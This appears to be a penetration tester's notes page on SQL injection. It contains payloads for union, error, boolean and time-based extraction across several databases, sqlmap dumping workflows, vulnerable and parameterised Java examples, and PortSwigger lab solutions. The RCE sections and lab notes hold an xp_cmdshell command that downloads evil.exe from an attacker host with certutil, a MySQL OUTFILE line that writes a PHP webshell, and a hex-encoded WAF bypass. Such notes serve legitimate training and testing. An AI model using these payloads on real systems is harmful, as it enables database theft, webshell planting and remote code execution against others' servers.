tactic: Multiple

**SQL Injection** is when user input is embedded directly into a SQL query, allowing an attacker to manipulate the query logic, bypass authentication, extract data, or achieve RCE in some cases.
## Types

**Classic**  input directly modifies the query, results visible in response:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1';
```

**Union-Based**  appends a second SELECT to extract data from other tables:

```sql
' UNION SELECT null, username, password FROM users--
```

**Error-Based**  triggers DB errors that leak schema/data in the response message.

**Boolean-Based Blind**  no output, but different responses for true/false conditions:

```sql
' AND 1=1--   ← true, normal response
' AND 1=2--   ← false, different response
```

**Time-Based Blind**  no output, no response difference, infer via response delay:

```sql
' AND SLEEP(5)--
```

---

## Injection Points

- Login forms, search fields, filter parameters
- URL path segments (`/users/1`, `/category/gifts`)
- Cookie values, `Referer`, `User-Agent`, `X-Forwarded-For` headers
- JSON/XML body parameters (REST and SOAP APIs)
- `ORDER BY`, `LIMIT`, `GROUP BY` clauses
- XML body parsed server-side (use Hackvertor to bypass WAF)

---

## Checklist

### Detection

- [ ]  Inject quote characters and watch for errors or behaviour change:

```sql
	'   "   `   ')   ")   `)   '))   "))
```

- [ ]  Fix the query with a comment to confirm injection:

```sql
	' --
	' #
	' /*comment*/
```

- [ ]  Inject logic operators to confirm true/false evaluation:

```sql
	' AND 1=1--    ← true
	' AND 1=2--    ← false
	' OR '1'='1
	-1 OR 1=1
```

### Comment Syntax by DB

```sql
MySQL       #comment   -- comment   /*comment*/
PostgreSQL  --comment  /*comment*/
MSSQL       --comment  /*comment*/
Oracle      --comment
SQLite      --comment  /*comment*/
```

### Union-Based Extraction

- [ ]  Find number of columns:

```sql
	' ORDER BY 1--
	' ORDER BY 2--
	' ORDER BY 3--    ← error here means 3 columns
	' UNION SELECT NULL--
	' UNION SELECT NULL,NULL--
	' UNION SELECT NULL,NULL,NULL--
```

- [ ]  Identify which columns return strings (replace NULL with `'a'`):

```sql
	' UNION SELECT 'a',NULL,NULL--
	' UNION SELECT NULL,'a',NULL--
```

- [ ]  Dump data:

```sql
	' UNION SELECT username, password FROM users--
	' UNION SELECT table_name, NULL FROM information_schema.tables--
	' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
```

- [ ]  Oracle  must select from a table:

```sql
	' UNION SELECT NULL, NULL FROM dual--
	' UNION SELECT BANNER, NULL FROM v$version--
```

### Blind Boolean-Based Extraction

- [ ]  Confirm the injection point responds differently for true/false
- [ ]  Extract data char by char using SUBSTRING:

```sql
	' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--
	' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0--
```

- [ ]  Use Burp Intruder with pitchfork, position 1 = char index, position 2 = char value

### Blind Time-Based Extraction

```sql
-- MySQL
1' AND SLEEP(10)--
SELECT IF(1=1, SLEEP(10), 'a')

-- PostgreSQL

1' || pg_sleep(10)--
SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--

-- MSSQL
1'; WAITFOR DELAY '0:0:10'--
IF (1=1) WAITFOR DELAY '0:0:10'

-- Oracle
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)--
SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual

-- SQLite
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))--
```


### RCE via SQLi

- [ ]  MSSQL  execute OS command via `xp_cmdshell`:

```sql
	'; EXEC xp_cmdshell 'certutil.exe -urlcache -split -f http://ATTACKER/evil.exe c:\windows\temp\evil.exe';--
```

- [ ]  MySQL  write a webshell via `OUTFILE`:


```sql
	UNION ALL SELECT 1,2,3,"<?php echo shell_exec($_GET['cmd']); ?>",5 INTO OUTFILE '/var/www/html/shell.php'
```

## SQLMap

**From saved request file:**

```bash
sqlmap -r ./request.txt --force-ssl --dbms=postgresql --proxy="http://127.0.0.1:8080"
```

**Workflow  enumerate then dump:**

```bash
# 1. Find databases
sqlmap -r request.txt --level 5 --risk 3 --dbms postgresql --technique E --dbs

# 2. Find tables in a database
sqlmap -r request.txt --level 5 --risk 3 --dbms postgresql --technique E -D public --tables

# 3. Dump table data
sqlmap -r request.txt --level 5 --risk 3 --dbms postgresql --technique E -D public -T users --dump

#Useful flags


--dbs              dump available databases
--tables           dump tables of selected DB
--dump             dump data from selected table
--technique        E=error, T=time, B=boolean, U=union
--tamper           tamper script e.g. space2comment
--proxy            route through Burp
--force-ssl        force HTTPS
```

## White Box Testing

**Vulnerable  string concatenation directly into query:**

```java
@GetMapping("/users")
public ResponseEntity<?> getUser(@RequestParam String username) {
    // ← username concatenated directly, attacker controls query structure
    String query = "SELECT * FROM users WHERE username = '" + username + "'";
    List<User> users = jdbcTemplate.query(query, new UserRowMapper());
    return ResponseEntity.ok(users);
}
```

**Vulnerable  HQL injection in Hibernate:**

```java
@Repository
public class UserRepository {
    public User findByUsername(String username) {
        // ← HQL is also injectable when concatenated
        String hql = "FROM User WHERE username = '" + username + "'";
        return (User) session.createQuery(hql).uniqueResult();
    }
}
```

**Vulnerable  ORDER BY clause not parameterised:**

```java
@GetMapping("/products")
public ResponseEntity<?> getProducts(@RequestParam String sortBy) {
    // ← parameters can't be used for column names, but concatenation is dangerous
    String query = "SELECT * FROM products ORDER BY " + sortBy;
    return ResponseEntity.ok(jdbcTemplate.queryForList(query));
}
```

**Secure:**

```java
// Parameterised query with JdbcTemplate — input bound separately from query structure
@GetMapping("/users")
public ResponseEntity<?> getUser(@RequestParam String username) {
    String query = "SELECT * FROM users WHERE username = ?";
    List<User> users = jdbcTemplate.query(query, new UserRowMapper(), username);
    return ResponseEntity.ok(users);
}

// Hibernate with named parameters
public User findByUsername(String username) {
    return (User) session.createQuery("FROM User WHERE username = :username")
        .setParameter("username", username)
        .uniqueResult();
}

// Spring Data JPA — safest approach, query is never constructed from user input
public interface UserRepository extends JpaRepository<User, Long> {
    Optional<User> findByUsername(String username); // ← generated query, no injection possible
}

// ORDER BY — whitelist allowed column names
private static final Set<String> ALLOWED_SORT_COLUMNS = Set.of("name", "price", "date");

@GetMapping("/products")
public ResponseEntity<?> getProducts(@RequestParam String sortBy) {
    if (!ALLOWED_SORT_COLUMNS.contains(sortBy)) {
        return ResponseEntity.badRequest().body("Invalid sort column");
    }
    return ResponseEntity.ok(jdbcTemplate.queryForList("SELECT * FROM products ORDER BY " + sortBy));
}
```

---



##  Lab

 **Blind SQL injection with time delays and information retrieval**

``` SQL

;SELECT CASE WHEN (username = 'administrator' and SUBSTR(password,1,1)='1') THEN pg_sleep(10) ELSE pg_sleep(0) END  from users  --

```

 **Blind SQL injection with conditional responses**


```sql
TrackingId=5hIAPABv6QExrguw' AND 'a'%3d'a
```


i noticed that the return byte value is different when the condition is true or false hence i checked with the comparer and noticed that the sentence Welcome back is present when its true and not in false

```sql
TrackingId=5hIAPABv6QExrguw' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), §1§, 1) = '§s§;

```

 **SQL injection attack, listing the database contents on non-Oracle databases**

[[OAuth 2.0]]
so then i tried with UNION query
```sql
'+UNION select NULL , NULL from Information_Schema
```

that worked so i started navigating  i checked both params are strings by adding `a` 

i listed the table_name  from information_schema

```sql
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

i noticed an instersting table name `users_bfyput` 

then i checked  its columns 
```sql
'UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_bfyput'

```


final exploit
```sql
GET /filter?category=Corporate+gifts' UNION  SELECT username_aijksa , password_ghkluz from users_bfyput -- 
```

 **SQL injection with filter bypass via XML encoding**


there is `WAF` so we need to obfuscate so i used hackvector to encode they payload in  hex


```
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId></stockCheck>
```

 **SQL injection attack, querying the database type and version on Oracle**

```sql
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

 **RCE**

```sql
';EXEC xp_cmdshell "certutil.exe -urlcache -split -f http://192.168.45.194/evil.exe c:\windows\temp\evil.exe";--
```


```sql
union all select 1,2,3,"<?php echo shell_exec($_GET['cmd']); ?>" ,5 into OUTFILE '/var/www/html/shell.php'
```
### References

- https://portswigger.net/web-security/sql-injection/cheat-sheet
- https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html?highlight=sql%20inject#identifying-with-portswigger
- https://portswigger.net/web-security/all-labs#sql-injection